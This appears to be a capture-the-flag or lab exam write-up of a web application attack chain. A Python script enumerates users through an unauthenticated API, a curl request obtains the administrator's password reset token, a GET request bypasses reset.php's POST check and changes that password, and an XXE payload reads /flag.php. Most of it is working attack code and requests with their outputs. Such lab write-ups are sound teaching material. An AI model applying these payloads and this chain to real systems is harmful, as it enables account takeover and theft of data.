# Exam Notes

## 1. Initial Observation: Password Reset Functionality

The **change password** feature is particularly interesting. The following JavaScript code is used on the client side:

```js
function resetPassword() {
    if ($("#new_password").val() == $("#confirm_new_password").val()) {
        $("#error_string").html('');
        fetch(`/api.php/token/${$.cookie("uid")}`, {
            method: 'GET'
        }).then(function(response) {
            return response.json();
        }).then(function(json) {
            fetch(`/reset.php`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: `uid=${$.cookie("uid")}&token=${json['token']}&password=${$("#new_password").val()}`
            }).then(function(response) {
                return response.text();
            }).then(function(res) {
                $("#error_string").html(res);
            });
        });
    } else {
        $("#error_string").html('Passwords do not match!');
    }
};
```

### Key Takeaways

* The client retrieves a **password reset token** using `/api.php/token/<uid>`.
* The token is then submitted along with the new password to `/reset.php`.
* All security decisions appear to rely on **client-controlled values** (UID and token).

---

## 2. Token Enumeration Vulnerability

It is possible to request password reset tokens for **arbitrary users** via the following endpoint:

```
/api.php/token/<uid>
```

There is no visible authorization check tying the token request to the authenticated user.

---

## 3. User Enumeration via API

Another interesting endpoint is used to fetch user details:

```js
$(document).ready(function() {
    fetch(`/api.php/user/${$.cookie("uid")}`, {
        method: 'GET'
    }).then(function(response) {
        return response.json();
    }).then(function(json) {
        $("#full_name").html(json['full_name']);
        $("#company").html(json['company']);
    });
});
```

### Finding

By changing the `uid` in the request path, **any user can be enumerated**.

---

## 4. Automated User Enumeration Script

The following Python script was used to enumerate users by iterating over UID values:

```python
import requests

for i in range(100):
    url = f"http://94.237.63.176:38575/api.php/user/{i}"

    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": "http://94.237.63.176:38575/profile.php",
        "Connection": "keep-alive",
        "Priority": "u=4",
    }

    cookies = {
        "PHPSESSID": "gd7feulsdl9167dkeomc597t57",
        "uid": "74",
    }

    response = requests.get(url, headers=headers, cookies=cookies)

    print("Status code:", response.status_code)
    print("Response body:")
    print(response.text)
```

### Result

A high-value user was identified:

```json
{
  "uid": "52",
  "username": "a.corrales",
  "full_name": "Amor Corrales",
  "company": "Administrator"
}
```

---

## 5. Obtaining a Reset Token for Another User

A password reset token can be retrieved for this administrator account:

```bash
curl -X GET "http://94.237.63.176:38575/api.php/token/52" \
  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" \
  -H "Accept: */*" \
  --cookie "PHPSESSID=gd7feulsdl9167dkeomc597t57; uid=74"
```

### Token Returned

```json
{
  "token": "e51a85fa-17ac-11ec-8e51-e78234eb7b0c"
}
```

---

## 6. Authentication Bypass in `reset.php`

### Attempt 1: POST Request (Fails)

```http
POST /reset.php HTTP/1.1
Cookie: PHPSESSID=s5bhmfc1flpeijlqcsnjb24tbo; uid=52

uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=admin
```

**Response:**

```
Access Denied
```

---

### Attempt 2: GET Request (Succeeds)

```http
GET /reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=koen1 HTTP/1.1
Cookie: PHPSESSID=gd7feulsdl9167dkeomc597t57; uid=74
```

**Response:**

```
Password changed successfully
```

### Conclusion

* `reset.php` incorrectly allows **password resets via GET requests**
* Authentication and method validation are missing or improperly implemented

---

## 7. Privilege Escalation: Logged in as Administrator

After resetting the password, logging in as the administrator reveals access to **event creation** functionality.

---

## 8. XML External Entity (XXE) Injection in Event Creation

The `addEvent.php` endpoint accepts XML input and is vulnerable to **XXE injection**.

### Exploit Payload

```http
POST /addEvent.php HTTP/1.1
Content-Type: text/plain;charset=UTF-8
Cookie: PHPSESSID=gd7feulsdl9167dkeomc597t57; uid=52

<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
]>
<root>
  <name>&company;</name>
  <details>blow2</details>
  <date>2026-01-05</date>
</root>
```

### Result

* The server reflects the `&company;` entity in the response
* This causes the contents of `/flag.php` to be base64-encoded and disclosed

---

## 9. Final Impact Summary

* **User Enumeration** via predictable UID-based API endpoints
* **Token Generation Abuse** for arbitrary users
* **Authentication Bypass** using HTTP method confusion
* **Administrator Account Takeover**
* **XXE Injection** leading to sensitive file disclosure (`/flag.php`)

